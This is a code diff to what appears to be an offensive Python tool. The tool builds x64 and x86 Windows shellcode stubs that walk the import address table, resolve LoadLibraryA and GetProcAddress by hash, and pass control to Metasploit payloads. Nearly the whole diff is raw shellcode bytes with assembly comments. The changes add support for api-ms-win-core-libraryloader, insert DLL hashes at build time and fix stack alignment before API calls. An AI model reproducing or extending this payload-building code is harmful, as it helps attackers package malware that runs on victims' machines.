@@ -692,6 +692,9 @@ class stubs_64:
         return shellcode
 
     def gpa_parser_stub(self):
+        parser_stub = 'LLAGPA'
+        importname = 'main_module'
+
         shellcode = bytes(
             "\xfc"                                              # cld 
             "\x52"                                              # push rdx
@@ -793,6 +796,8 @@ class stubs_64:
         return shellcode
 
     def loaded_lla_gpa_parser_stub(self):
+        self.parser_stub = 'ExternLLAGPA'
+        
         shellcode = bytes(
                     "\xfc"                                              # cld 
                     "\x52"                                              # push rdx
@@ -822,8 +827,12 @@ class stubs_64:
                     "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
                     "\x41\x01\xc1"                                      # add r9d, eax
                     "\xe2\xed"                                          # loop 0x2d
-                    "\x41\x81\xf9\xf4\x43\x8a\xc7"                      # cmp r9d, 0xc78a43f4
-                    "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+                    , 'iso-8859-1'
+                    )
+        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
+        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
+        
+        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
                     "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
                     "\x75\xd3"                                          # jne 0x23
                     "\x4c\x89\xea"                                      # mov rdx, r13
@@ -833,12 +842,33 @@ class stubs_64:
                     "\x4c\x01\xef"                                      # add rdi, r13
                     "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
                     "\x4c\x01\xea"                                      # add rdx, r13
+                    , 'iso-8859-1'
+                    )
+        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
+            shellcode += bytes(
                     "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
                     "\x75\x09"                                          # jne 0x79
                     "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
                     "\x74\x06"                                          # je 0x7f
                     "\x48\x83\xc7\x14"                                  # add rdi, 0x14
                     "\xeb\xe3"                                          # jmp 0x62
+                    , 'iso-8859-1')
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
+            shellcode += bytes(
+                    
+                    "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
+                    "\x75\x09"                                          # jne 0x79
+                    "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+                    "\x74\x06"                                          # je 0x7f
+                    "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+                    "\xeb\xe2"                                          # jmp 0x62
+                    , 'iso-8859-1'
+                    )
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
+            sys.exit(-1)
+        
+        shellcode += bytes(
                     "\x57"                                              # push rdi
                     "\xeb\x47"                                          # jmp 0xc9
                     "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
@@ -865,7 +895,18 @@ class stubs_64:
                     "\x41\x83\xc3\x04"                                  # add r11d, 4
                     "\x48\x83\xc6\x04"                                  # add rsi, 4
                     "\xeb\xd1"                                          # jmp 0x9a
-                    "\x68\x61\x72\x79\x41"                              # push 0x41797261
+                    , 'iso-8859-1'
+                    )
+                    #"\x68\x61\x72\x79\x41"                              # push 0x41797261
+        if self.impts.DLL_INFO['importname'].lower() == 'kernel32.dll':
+            shellcode += b"\x68\x61\x72\x79\x41"                 # push dword 0x41797261 ; raryA
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
+            shellcode += b"\x68\x61\x72\x79\x45"
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
+
+        shellcode +=  bytes(
                     "\x68\x4c\x6f\x61\x64"                              # push 0x64616f4c
                     "\xe8\xaa\xff\xff\xff"                              # call 0x82
                     "\x4c\x01\xda"                                      # add rdx, r11
@@ -881,9 +922,12 @@ class stubs_64:
                     "\x41\x5e"                                          # pop r14
                     "\x49\x89\xd7"                                      # mov r15, rdx
                     , 'iso-8859-1')
+        
         return shellcode
     
     def loaded_gpa_iat_parser_stub(self):
+        self.parser_stub = 'ExternGPA'
+        
         shellcode = bytes(
             "\xfc"                                              # cld 
             "\x52"                                              # push rdx
@@ -913,8 +957,12 @@ class stubs_64:
             "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
             "\x41\x01\xc1"                                      # add r9d, eax
             "\xe2\xed"                                          # loop 0x2d
-            "\x41\x81\xf9\xf4\x43\x8a\xc7"                      # cmp r9d, 0xc78a43f4
-            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            , 'iso-8859-1'
+            )
+        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
+        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
+        
+        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
             "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
             "\x75\xd3"                                          # jne 0x23
             "\x4c\x89\xea"                                      # mov rdx, r13
@@ -924,12 +972,33 @@ class stubs_64:
             "\x4c\x01\xef"                                      # add rdi, r13
             "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
             "\x4c\x01\xea"                                      # add rdx, r13
+            , 'iso-8859-1'
+            )
+        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
+            shellcode += bytes(
             "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
             "\x75\x09"                                          # jne 0x79
             "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
             "\x74\x06"                                          # je 0x7f
             "\x48\x83\xc7\x14"                                  # add rdi, 0x14
             "\xeb\xe3"                                          # jmp 0x62
+            , 'iso-8859-1'
+            )
+        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
+            shellcode += bytes(
+                    
+            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
+            "\x75\x09"                                          # jne 0x79
+            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+            "\x74\x06"                                          # je 0x7f
+            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
+            "\xeb\xe2"                                          # jmp 0x62
+            , 'iso-8859-1'
+            )
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
+            sys.exit(-1)
+        shellcode += bytes(
             "\x57"                                              # push rdi
             "\xeb\x47"                                          # jmp 0xc9
             "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
@@ -1767,15 +1836,15 @@ class x86_windows_metasploit:
             string_set.add(api.split("!")[0].replace(".dll",''))
             string_set.add(api.split("!")[1])
         
-        # For testing
         
-        # For xor need modulo 4
         for api in string_set:
             self.string_table += api + "\x00"
 
         self.string_table = bytes(self.string_table, 'iso-8859-1')
         # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
-        # XOR table here...
+        
+        # XOR table here... if you wanted... in the future... maybe pull request?
+        
         sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
         
         self.lookup_table = tmp_bytes + self.string_table
@@ -1790,12 +1859,9 @@ class x86_windows_metasploit:
             a = re.search(bytes(anAPI, 'iso-8859-1'), self.lookup_table)
             self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
         
-        # Find and select IAT parser here:
-        # set 32 vs 64 bit MODE here
         self.decision_tree()
 
         # This is the stub that is appended to the IAT parser
-        # set 32 vs 64 bit MODE HERE
         sys.stderr.write("[*] Assembling lookup table stub\n")
         if self.mode == CS_MODE_32:
 
@@ -1880,14 +1946,12 @@ class x86_windows_metasploit:
             self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)   
             self.stub += b"\xC3"                                # RETN                           ; return back into msf payload logic
 
-
             self.jump_stub = b"\xe8"
             self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
         
         else:
             # 64 bit
-            # I'll need to move this around for x64 calling convention (RCX, RDX, R8, R9)
-
+           
             self.stub = b''
             self.stub += b"\xe9"
             self.stub += struct.pack("<I", len(self.lookup_table))
@@ -1936,13 +2000,15 @@ class x86_windows_metasploit:
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                 sys.exit(-1)
-     
             
-            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
-            self.stub += b"\x41\xFF\x16"                                # CALL QWORD PTR DS:[r14]        ; Call KERNEL32.LoadLibraryA (DLL)
+            self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
+            self.stub += b"\x48\x89\xE5"                             # mov rbp, rsp           # ;save stack
+            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
+            self.stub += b"\x41\xFF\x16"                             # CALL QWORD PTR DS:[r14]        ; Call KERNEL32.LoadLibraryA (DLL)
+            self.stub += b"\x48\x89\xEC"                             # mov rsp, rbp              # restore stack
+            
             # Get API and Call GPA
-            
-            self.stub += b"\x48\x89\xC2"                            # MOV RDX,RAX                    ; Save DLL Handle to EDX
+            self.stub += b"\x48\x89\xC2"                             # MOV RDX,RAX                    ; Save DLL Handle to EDX
             if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                 self.stub += b"\x31\xC0"                    # XOR EAX,EAX                    ; Prep EAX for use
                 # this push on x64?? Look at it on x86 (might not be important)
@@ -1953,6 +2019,7 @@ class x86_windows_metasploit:
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                 sys.exit(-1)
+            
             self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
             self.stub += struct.pack("<I", updated_offset + 4)  
             self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
@@ -1961,13 +2028,15 @@ class x86_windows_metasploit:
             self.stub += b"\x48\x81\xE9"                        # SUB ECX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
             self.stub += b"\x48\x87\xD1"                        # xchg rcx, rdx                  ; Use the proper registers for gpa
+            
             self.stub += b"\x48\x83\xEC\x20"                    # sub rsp, 0x20
+            self.stub += b"\x48\x89\xE5"                             # mov rbp, rsp           # ;save stack
+            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
             self.stub += b"\x41\xFF\x17"                        # CALL QWORD PTR DS:[r15]        ; Call Getprocaddress(DLL.handle, API)
+            self.stub += b"\x48\x89\xEC"                             # mov rsp, rbp              # restore stack
+            
             # Call API RAX has API
-            #Stopped here
-            # now I need to track the stack
-            # restore stuff stack and return
-            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 40
+            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 40 ; align stack
             
             self.stub += b"\x41\x5f"                 #  pop    r15
             self.stub += b"\x41\x5e"                 #  pop    r14
@@ -1981,9 +2050,8 @@ class x86_windows_metasploit:
             self.stub += b"\x59"                     # pop    rcx
             self.stub += b"\x5a"                     # pop    rdx
             self.stub += b"\x5D"                                     # pop    rbp (save return addr)
-            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; align the stack
+            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
             self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
-            
             self.stub += b"\xFF\xD0"                                 # CALL RAX                       ; call target API
             # Recover
             
